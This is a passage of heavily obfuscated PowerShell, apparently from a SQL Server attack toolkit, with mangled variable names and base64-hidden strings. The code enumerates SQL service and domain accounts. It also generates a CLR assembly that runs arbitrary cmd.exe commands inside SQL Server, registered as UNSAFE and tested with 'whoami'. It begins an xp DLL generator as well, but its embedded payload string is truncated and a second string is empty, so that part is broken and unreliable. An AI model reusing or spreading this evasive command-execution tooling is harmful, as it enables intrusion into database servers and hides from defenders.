            ${_/====\/\/=\/\/==} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ACQAewBfAF8AXwBfAF8ALwA9AFwAXwBfAF8ALwBcAC8AXABfAF8AfQAkAHsAXwBfAF8ALwBcAF8ALwBcAF8AXwBfAF8ALwBcAF8AXwAvAH0A')))
            $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIAAgACAAIAAnACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAJwAgAGEAcwAgAFsAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACcAJABJAG4AcwB0AGEAbgBjAGUAJwAgAGEAcwAgAFsASQBuAHMAdABhAG4AYwBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAnACQAewBfAC8APQA9AD0APQBcAC8AXAAvAD0AXAAvAFwALwA9AD0AfQAnACAAYQBzACAAWwBSAEkARABdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMAVQBTAEUAUgBfAFMATgBBAE0ARQAoACQAewBfAC8APQA9AD0APQBcAC8AXAAvAD0AXAAvAFwALwA9AD0AfQApACAAYQBzACAAWwBEAG8AbQBhAGkAbgBBAGMAYwBvAHUAbgB0AF0A')))
            ${/=\_____/\/\/=\__} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            $DomainAccount = ${/=\_____/\/\/=\__}.DomainAccount
            if($DomainAccount.length -ge 2)
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAFIASQBEACAAJAB7AF8ALwA9AD0APQA9AFwALwBcAC8APQBcAC8AXAAvAD0APQB9ACAAKAAkAF8AKQAgAHIAZQBzAG8AbAB2AGUAZAAgAHQAbwA6ACAAJABEAG8AbQBhAGkAbgBBAGMAYwBvAHUAbgB0AA==')))
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAFIASQBEACAAJAB7AF8ALwA9AD0APQA9AFwALwBcAC8APQBcAC8AXAAvAD0APQB9ACAAKAAkAF8AKQAgAHIAZQBzAG8AbAB2AGUAZAAgAHQAbwA6ACAA')))
                }
            }
            ${/\_____/\_/==\___} = ${/\_____/\_/==\___} + ${/=\_____/\/\/=\__}
        }
    }
    End
    {
        ${/\_____/\_/==\___} |
        select -Property ComputerName, Instance, DomainAccount -Unique |
        ? -FilterScript {
            $_.DomainAccount -notlike ''
        }
    }
}
Function Get-ComputerNameFromInstance
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance.')]
        [string]$Instance
    )
    If ($Instance)
    {
        $ComputerName = $Instance.split('\')[0].split(',')[0]
    }
    else
    {
        $ComputerName = $env:COMPUTERNAME
    }
    Return $ComputerName
}
Function  Get-SQLServiceLocal
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance.')]
        [string]$Instance,
       [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for running services.')]
        [switch]$RunOnly,
                [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${________/\___/\_/} = New-Object -TypeName System.Data.DataTable
        $null = ${________/\___/\_/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${________/\___/\_/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${________/\___/\_/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBEAGkAcwBwAGwAYQB5AE4AYQBtAGUA'))))
        $null = ${________/\___/\_/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBOAGEAbQBlAA=='))))
        $null = ${________/\___/\_/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAdABoAA=='))))
        $null = ${________/\___/\_/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBBAGMAYwBvAHUAbgB0AA=='))))
        $null = ${________/\___/\_/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBTAHQAYQB0AGUA'))))
        $null = ${________/\___/\_/}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAHIAbwBjAGUAcwBzAEkAZAA='))))
    }
    Process
    {
        ${_/==\_/==\_/===\/} = gwmi -Class win32_service |
        ? -FilterScript {
            $_.DisplayName -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAIABTAGUAcgB2AGUAcgAgACoA')))
        } |
        select -Property DisplayName, PathName, Name, StartName, State, SystemName, ProcessId
        ${_/==\_/==\_/===\/} |
        % -Process {
            $ComputerName = [string]$_.SystemName
            ${__/==\/=\/\/\_/=\} = [string]$_.DisplayName
            ${/===\__/=\_/\/\_/} = [string]$_.State
            ${/=\_/=\/===\__/\_} = $ComputerName
            ${___/\/\_/\/====\_} = (${__/==\/=\/\/\_/=\}[1..${__/==\/=\/\/\_/=\}.Length] | ? {$_ -like '('}).count
            if(${___/\/\_/\/====\_}) {
                ${/=\_/=\/===\__/\_} = $ComputerName + '\' +${__/==\/=\/\/\_/=\}.split('(')[1].split(')')[0]
                if(${/=\_/=\/===\__/\_} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBcAE0AUwBTAFEATABTAEUAUgBWAEUAUgA='))))
                {
                    ${/=\_/=\/===\__/\_} = $ComputerName
                }
            }
            if($Instance -and $instance -notlike ${/=\_/=\/===\__/\_}){
                return
            }
            if($RunOnly -and ${/===\__/=\_/\/\_/} -notlike $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AbgBpAG4AZwA=')))){
                return    
            }
            if($_.ProcessId -eq 0){
                ${/=\/=\/\/\__/=\__} = ""
            }else{
                ${/=\/=\/\/\__/=\__} = $_.ProcessId
            }
            $null = ${________/\___/\_/}.Rows.Add(
                [string]$_.SystemName,
                [string]${/=\_/=\/===\__/\_},
                [string]$_.DisplayName,
                [string]$_.Name,
                [string]$_.PathName,
                [string]$_.StartName,
                [string]$_.State,
                [string]${/=\/=\/\/\__/=\__})            
        }
    }
    End
    {
        ${/==\_/\/=\/\_/\__} = ${________/\___/\_/}.rows.count
        if(-not $SuppressVerbose){
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AFwAXwAvAFwALwA9AFwALwBcAF8ALwBcAF8AXwB9ACAAbABvAGMAYQBsACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgAHMAZQByAHYAaQBjAGUAcwAgAHcAZQByAGUAIABmAG8AdQBuAGQAIAB0AGgAYQB0ACAAbQBhAHQAYwBoAGUAZAAgAHQAaABlACAAYwByAGkAdABlAHIAaQBhAC4A')))        
        }
        ${________/\___/\_/} 
    }
}
function Create-SQLFileCLRDll
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Procedure name.')]
        [string]$ProcedureName = "cmd_exec",  
        [Parameter(Mandatory = $false,
        HelpMessage = 'Directory to output files.')]
        [string]$OutDir = ${env:/==\/==\__/\__/\_}, 
        [Parameter(Mandatory = $false,
        HelpMessage = 'Set custom assembly name. It is random by default.')]
        [string]$AssemblyName, 
        [Parameter(Mandatory = $false,
        HelpMessage = 'Set custom assembly class name. It is random by default.')]
        [string]$AssemblyClassName,    
        [Parameter(Mandatory = $false,
        HelpMessage = 'Set custom assembly method name. It is random by default.')]
        [string]$AssemblyMethodName,             
        [Parameter(Mandatory = $false,
        HelpMessage = 'Output name.')]
        [string]$OutFile = "CLRFile",
        [Parameter(Mandatory = $false,
        HelpMessage = 'Optional source DLL to convert to ascii hex.')]
        [string]$SourceDllPath
    )
    Begin
    {
        ${___/====\____/===} = $OutDir + '\' + $OutFile + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBjAHMAYwA=')))
        ${___/\/=\/\/=\/=\/} = $OutDir + '\' + $OutFile + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBkAGwAbAA=')))
        ${_/=\/\___/=\_____} = $OutDir + '\' + $OutFile + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgB0AHgAdAA=')))
        if($SourceDllPath){
            ${___/\/=\/\/=\/=\/} = $SourceDllPath
            ${___/====\____/===} = "NA"
        }
    }
    Process 
    {
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAIABDACMAIAAgAEYAaQBsAGUAOgAgACQAewBfAF8AXwAvAD0APQA9AD0AXABfAF8AXwBfAC8APQA9AD0AfQA='))) 
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAIABEAEwATAAgAEYAaQBsAGUAOgAgACQAewBfAF8AXwAvAFwALwA9AFwALwBcAC8APQBcAC8APQBcAC8AfQA=')))
        ${/=\/====\/\_____/} = (5..10 | Get-Random -count 1 )
        ${/==\/\_/==\/=\/=\} = (5..10 | Get-Random -count 1 )
        ${/=\__/====\__/==\} = (5..10 | Get-Random -count 1 )
        If(-not $AssemblyClassName){                                       
            $AssemblyClassName = (-join ((65..90) + (97..122) | Get-Random -Count ${/=\/====\/\_____/} | % {[char]$_}))
        }
        if(-not $AssemblyMethodName){
            $AssemblyMethodName = (-join ((65..90) + (97..122) | Get-Random -Count ${/==\/\_/==\/=\/=\} | % {[char]$_}))
        }
        If(-not $AssemblyName){
            $AssemblyName = (-join ((65..90) + (97..122) | Get-Random -Count ${/==\/\_/==\/=\/=\} | % {[char]$_}))
        }
        if (-not $SourceDllPath){
            ${_/====\/==\/\/==\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgACAAIAAgACAAIAAgACAAIAAgACAAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBEAGEAdABhADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4ARABhAHQAYQAuAFMAcQBsAEMAbABpAGUAbgB0ADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4ARABhAHQAYQAuAFMAcQBsAFQAeQBwAGUAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIABNAGkAYwByAG8AcwBvAGYAdAAuAFMAcQBsAFMAZQByAHYAZQByAC4AUwBlAHIAdgBlAHIAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBJAE8AOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0ADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAcABhAHIAdABpAGEAbAAgAGMAbABhAHMAcwAgACQAQQBzAHMAZQBtAGIAbAB5AEMAbABhAHMAcwBOAGEAbQBlAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABbAE0AaQBjAHIAbwBzAG8AZgB0AC4AUwBxAGwAUwBlAHIAdgBlAHIALgBTAGUAcgB2AGUAcgAuAFMAcQBsAFAAcgBvAGMAZQBkAHUAcgBlAF0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIAB2AG8AaQBkACAAJABBAHMAcwBlAG0AYgBsAHkATQBlAHQAaABvAGQATgBhAG0AZQAgACgAUwBxAGwAUwB0AHIAaQBuAGcAIABlAHgAZQBjAEMAbwBtAG0AYQBuAGQAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUAByAG8AYwBlAHMAcwAgAHAAcgBvAGMAIAA9ACAAbgBlAHcAIABQAHIAbwBjAGUAcwBzACgAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAHIAbwBjAC4AUwB0AGEAcgB0AEkAbgBmAG8ALgBGAGkAbABlAE4AYQBtAGUAIAA9ACAAQAAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQAzADIAXABjAG0AZAAuAGUAeABlACIAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcAByAG8AYwAuAFMAdABhAHIAdABJAG4AZgBvAC4AQQByAGcAdQBtAGUAbgB0AHMAIAA9ACAAcwB0AHIAaQBuAGcALgBGAG8AcgBtAGEAdAAoAEAAIgAgAC8AQwAgAHsAMAB9ACIALAAgAGUAeABlAGMAQwBvAG0AbQBhAG4AZAAuAFYAYQBsAHUAZQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAAcgBvAGMALgBTAHQAYQByAHQASQBuAGYAbwAuAFUAcwBlAFMAaABlAGwAbABFAHgAZQBjAHUAdABlACAAPQAgAGYAYQBsAHMAZQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAHIAbwBjAC4AUwB0AGEAcgB0AEkAbgBmAG8ALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0ACAAPQAgAHQAcgB1AGUAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcAByAG8AYwAuAFMAdABhAHIAdAAoACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAvAC8AIABDAHIAZQBhAHQAZQAgAHQAaABlACAAcgBlAGMAbwByAGQAIABhAG4AZAAgAHMAcABlAGMAaQBmAHkAIAB0AGgAZQAgAG0AZQB0AGEAZABhAHQAYQAgAGYAbwByACAAdABoAGUAIABjAG8AbAB1AG0AbgBzAC4ADQAKAAkAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUwBxAGwARABhAHQAYQBSAGUAYwBvAHIAZAAgAHIAZQBjAG8AcgBkACAAPQAgAG4AZQB3ACAAUwBxAGwARABhAHQAYQBSAGUAYwBvAHIAZAAoAG4AZQB3ACAAUwBxAGwATQBlAHQAYQBEAGEAdABhACgAIgBvAHUAdABwAHUAdAAiACwAIABTAHEAbABEAGIAVAB5AHAAZQAuAE4AVgBhAHIAQwBoAGEAcgAsACAANAAwADAAMAApACkAOwANAAoACQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAvAC8AIABNAGEAcgBrACAAdABoAGUAIABiAGUAZwBpAG4AaQBuAGcAIABvAGYAIAB0AGgAZQAgAHIAZQBzAHUAbAB0AC0AcwBlAHQALgANAAoACQAgACAAIAAgACAAIAAgACAAIAAgACAAIABTAHEAbABDAG8AbgB0AGUAeAB0AC4AUABpAHAAZQAuAFMAZQBuAGQAUgBlAHMAdQBsAHQAcwBTAHQAYQByAHQAKAByAGUAYwBvAHIAZAApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAALwAvACAAUwBlAHQAIAB2AGEAbAB1AGUAcwAgAGYAbwByACAAZQBhAGMAaAAgAGMAbwBsAHUAbQBuACAAaQBuACAAdABoAGUAIAByAG8AdwANAAoACQAgACAAIAAgACAAIAAgACAAIAAgACAAIAByAGUAYwBvAHIAZAAuAFMAZQB0AFMAdAByAGkAbgBnACgAMAAsACAAcAByAG8AYwAuAFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQAuAFQAbwBTAHQAcgBpAG4AZwAoACkAKQA7AA0ACgAJACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAFMAZQBuAGQAIAB0AGgAZQAgAHIAbwB3ACAAYgBhAGMAawAgAHQAbwAgAHQAaABlACAAYwBsAGkAZQBuAHQALgANAAoACQAgACAAIAAgACAAIAAgACAAIAAgACAAIABTAHEAbABDAG8AbgB0AGUAeAB0AC4AUABpAHAAZQAuAFMAZQBuAGQAUgBlAHMAdQBsAHQAcwBSAG8AdwAoAHIAZQBjAG8AcgBkACkAOwANAAoACQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAvAC8AIABNAGEAcgBrACAAdABoAGUAIABlAG4AZAAgAG8AZgAgAHQAaABlACAAcgBlAHMAdQBsAHQALQBzAGUAdAAuAA0ACgAJACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMAcQBsAEMAbwBuAHQAZQB4AHQALgBQAGkAcABlAC4AUwBlAG4AZABSAGUAcwB1AGwAdABzAEUAbgBkACgAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAHIAbwBjAC4AVwBhAGkAdABGAG8AcgBFAHgAaQB0ACgAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAHIAbwBjAC4AQwBsAG8AcwBlACgAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9ADsA')))
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABpAG4AZwAgAEMAIwAgAGMAbwBkAGUAIAB0AG8AIAAkAHsAXwBfAF8ALwA9AD0APQA9AFwAXwBfAF8AXwAvAD0APQA9AH0A'))) 
            ${_/====\/==\/\/==\} | Out-File ${___/====\____/===}
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAcwBjAC4AZQB4AGUALgAuAC4A'))) 
            ${_/=\___/\_/=\/\/\} = ls -Recurse $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAVwBpAG4AZABvAHcAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AC4ATgBFAFQAXAA='))) -Filter "csc.exe" | sort fullname -Descending | select fullname -First 1 -ExpandProperty fullname
            if(-not ${_/=\___/\_/=\/\/\}){
                Write-Host $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAYwBzAGMALgBlAHgAZQAgAGYAbwB1AG4AZAAuAA==')))
                return
            }else{
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBzAGMALgBlAHgAZQAgAGYAbwB1AG4AZAAuAA==')))
            }
            ${/==\_/====\/\/\_/} = pwd
            cd $OutDir
            $Command = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwA9AFwAXwBfAF8ALwBcAF8ALwA9AFwALwBcAC8AXAB9ACAALwB0AGEAcgBnAGUAdAA6AGwAaQBiAHIAYQByAHkAIAA='))) + ${___/====\____/===}                   
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcABpAGwAaQBuAGcAIAB0AG8AIABkAGwAbAAuAC4ALgA=')))
            ${__/\/=\/=\/\/\_/\} = iex $Command
            cd ${/==\_/====\/\/\_/}
        }
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAGEAYgBiAGkAbgBnACAAYgB5AHQAZQBzACAAZgByAG8AbQAgAHQAaABlACAAZABsAGwA'))) 
        if (-not $SourceDllPath){
            ${/==\/\_/=\_/===\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABQAHIAbwBjAGUAZAB1AHIAZQBOAGEAbQBlAA==')))
            ${_/=\_/\_/\_/\_/==} = New-Object -Type System.Text.StringBuilder
            ${_/=\_/\_/\_/\_/==}.Append($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBSAEUAQQBUAEUAIABBAFMAUwBFAE0AQgBMAFkAIABbAA==')))) > $null
            ${_/=\_/\_/\_/\_/==}.Append($AssemblyName) > $null
            ${_/=\_/\_/\_/\_/==}.Append($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XQAgAEEAVQBUAEgATwBSAEkAWgBBAFQASQBPAE4AIABbAGQAYgBvAF0AIABGAFIATwBNACAACgAwAHgA')))) > $null
            ${_/=\/\_/=\_/\/===} = resolve-path ${___/\/=\/\/=\/=\/}
            ${/==\/\/==\__/\___} = [IO.File]::OpenRead(${_/=\/\_/=\_/\/===})
             while ((${/====\/\_/\_/=\/=} = ${/==\/\/==\__/\___}.ReadByte()) -gt -1) {
                ${_/=\_/\_/\_/\_/==}.Append(${/====\/\_/\_/=\/=}.ToString("X2")) > $null
            }
            $null = ${_/=\_/\_/\_/\_/==}.AppendLine($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgBXAEkAVABIACAAUABFAFIATQBJAFMAUwBJAE8ATgBfAFMARQBUACAAPQAgAFUATgBTAEEARgBFAA=='))))
            $null = ${_/=\_/\_/\_/\_/==}.AppendLine("GO")
            $null = ${_/=\_/\_/\_/\_/==}.AppendLine($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBSAEUAQQBUAEUAIABQAFIATwBDAEUARABVAFIARQAgAFsAZABiAG8AXQAuAFsAJAB7AC8APQA9AFwALwBcAF8ALwA9AFwAXwAvAD0APQA9AFwALwB9AF0AIABAAGUAeABlAGMAQwBvAG0AbQBhAG4AZAAgAE4AVgBBAFIAQwBIAEEAUgAgACgANAAwADAAMAApACAAQQBTACAARQBYAFQARQBSAE4AQQBMACAATgBBAE0ARQAgAFsAJABBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQBdAC4AWwAkAEEAcwBzAGUAbQBiAGwAeQBDAGwAYQBzAHMATgBhAG0AZQBdAC4AWwAkAEEAcwBzAGUAbQBiAGwAeQBNAGUAdABoAG8AZABOAGEAbQBlAF0AOwA='))))
            $null = ${_/=\_/\_/\_/\_/==}.AppendLine("GO")
            $null = ${_/=\_/\_/\_/\_/==}.AppendLine($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAQwBbAGQAYgBvAF0ALgBbACQAewAvAD0APQBcAC8AXABfAC8APQBcAF8ALwA9AD0APQBcAC8AfQBdACAAJwB3AGgAbwBhAG0AaQAnAA=='))))        
            $null = ${_/=\_/\_/\_/\_/==}.AppendLine("GO")
            ${_/\_/\/=\/=\__/==} = ${_/=\_/\_/\_/\_/==}.ToString() -join ""
            ${/==\/\/==\__/\___}.Close()
            ${/==\/\/==\__/\___}.Dispose()
        }else{
            ${_/=\_/\_/\_/\_/==} = New-Object -Type System.Text.StringBuilder
            $null = ${_/=\_/\_/\_/\_/==}.AppendLine($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtACAAQwBoAGEAbgBnAGUAIAB0AGgAZQAgAGEAcwBzAGUAbQBiAGwAeQAgAG4AYQBtAGUAIAB0AG8AIAB0AGgAZQAgAG8AbgBlACAAeQBvAHUAIAB3AGEAbgB0ACAAdABvACAAcgBlAHAAbABhAGMAZQA='))))  
            $null = ${_/=\_/\_/\_/\_/==}.AppendLine($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBMAFQARQBSACAAQQBTAFMARQBNAEIATABZACAAWwBUAEIARABdACAARgBSAE8ATQA='))))
            $null = ${_/=\_/\_/\_/\_/==}.Append($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgAwAHgA')))) 
            ${_/=\/\_/=\_/\/===} = resolve-path ${___/\/=\/\/=\/=\/}
            ${/==\/\/==\__/\___} = [IO.File]::OpenRead(${_/=\/\_/=\_/\/===})
             while ((${/====\/\_/\_/=\/=} = ${/==\/\/==\__/\___}.ReadByte()) -gt -1) {
                ${_/=\_/\_/\_/\_/==}.Append(${/====\/\_/\_/=\/=}.ToString("X2")) > $null
            }
            $null = ${_/=\_/\_/\_/\_/==}.AppendLine($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgBXAEkAVABIACAAUABFAFIATQBJAFMAUwBJAE8ATgBfAFMARQBUACAAPQAgAFUATgBTAEEARgBFAA=='))))
            $null = ${_/=\_/\_/\_/\_/==}.Append("")
            ${_/\_/\/=\/=\__/==} = ${_/=\_/\_/\_/\_/==}.ToString() -join ""
            ${/==\/\/==\__/\___}.Close()
            ${/==\/\/==\__/\___}.Dispose()
        }
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABpAG4AZwAgAFMAUQBMACAAdABvADoAIAAkAHsAXwAvAD0AXAAvAFwAXwBfAF8ALwA9AFwAXwBfAF8AXwBfAH0A')))
        ${_/\_/\/=\/=\__/==} | Out-File ${_/=\/\___/=\_____} 
        Write-Host $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwAjACAARgBpAGwAZQA6ACAAJAB7AF8AXwBfAC8APQA9AD0APQBcAF8AXwBfAF8ALwA9AD0APQB9AA==')))
        Write-Host $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBMAFIAIABEAEwATAA6ACAAJAB7AF8AXwBfAC8AXAAvAD0AXAAvAFwALwA9AFwALwA9AFwALwB9AA==')))
        Write-Host $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAIABDAG0AZAA6ACAAJAB7AF8ALwA9AFwALwBcAF8AXwBfAC8APQBcAF8AXwBfAF8AXwB9AA==')))        
    }
    End 
    {
    }
}
function Create-SQLFileXpDll
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Operating system command to run.')]
        [string]$Command,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Name of exported function.')]
        [string]$ExportName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Dll file to write to.')]
        [string]$OutFile
    )
    ${___/=\_/\_/=\/\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('
    [Byte[]]${____/\_/=\/\_/==\} = [Byte[]][Convert]::FromBase64String(${___/=\_/\_/=\/\_/})
    ${__/\__/\/==\/\__/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('')))
    IF(-not($Command))
    {
        ${/=\/\/=\/\__/==\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBjAGgAbwAgAFQAaABpAHMAIABpAHMAIABhACAAdABlAHMAdAAuACAAPgAgAGMAOgBcAHQAZQBtAHAAXAB0AGUAcwB0AC4AdAB4AHQAIAAmACYAIABSAEUATQA=')))
    }
    else
    {
        ${/=\/\/=\/\__/==\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABDAG8AbQBtAGEAbgBkACAAJgAmACAAUgBFAE0A')))
    }
    ${/==\/\_/=\/\/====} = ${__/\__/\/==\/\__/}.Length
    ${_/=\/===\___/=\_/} = ${/=\/\/=\/\__/==\/}.Length
    if (${_/=\/===\___/=\_/} -gt ${/==\/\_/=\/\/====})
    {
        Write-Warning -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABDAG8AbQBtAGEAbgBkACAAaQBzACAAdABvAG8AIABsAG8AbgBnACEA')))
        Break
    }
    else
    {
        ${_/\_____/\/=\____} = ${/==\/\_/=\/\/====} - ${_/=\/===\___/=\_/}
        ${__/\/=\/===\/==\/} = ' ' * ${_/\_____/\/=\____}
        ${/=\/\/=\/\__/==\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAC8AXAAvAD0AXAAvAFwAXwBfAC8APQA9AFwALwB9ACAAJgAmACAAUgBFAE0AIAAkAHsAXwBfAC8AXAAvAD0AXAAvAD0APQA9AFwALwA9AD0AXAAvAH0A')))
    }
